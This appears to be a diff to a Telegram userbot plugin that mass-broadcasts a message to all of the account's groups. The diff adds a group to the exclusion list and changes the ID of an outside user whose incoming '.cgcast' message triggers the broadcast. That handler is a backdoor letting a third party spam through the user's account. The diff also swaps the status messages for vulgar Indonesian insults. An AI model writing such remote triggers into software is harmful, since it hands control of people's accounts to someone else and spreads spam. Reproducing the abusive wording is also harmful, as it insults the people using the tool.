@@ -27,12 +27,13 @@ GCAST_BLACKLIST = [
     -1001318051930,  # Gatau GC mana
     -1001433478384,  # anjay saya bohong
     -1001688172956,  # ga kekinian support
+    -1001728993415,  # Yang penting support
 
 ]
 
 
 @kyy_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@register(incoming=True, from_users=5169252959,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -41,8 +42,8 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        return await edit_delete(event, "**Berikan Sebuah Pesan atau Reply**")
-    kk = await edit_or_reply(event, "`Sedang Mengirim Pesan Secara Global... 📢`")
+        return await edit_delete(event, "**Kasih Tulisannya Kontol atau Reply Pesan mek**")
+    kk = await edit_or_reply(event, "`Sabar ya kentot nih gikes lu gue sebar, kalo limit resiko lu mampus... 📢`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -57,7 +58,7 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
+        f"**Nih Gikes Lu Kontol Berhasil Ke** `{done}` **Grup, Karna Lu Bau Jadi Gagal Ngirim Pesan Ke** `{er}` **Grup**"
     )
 
 
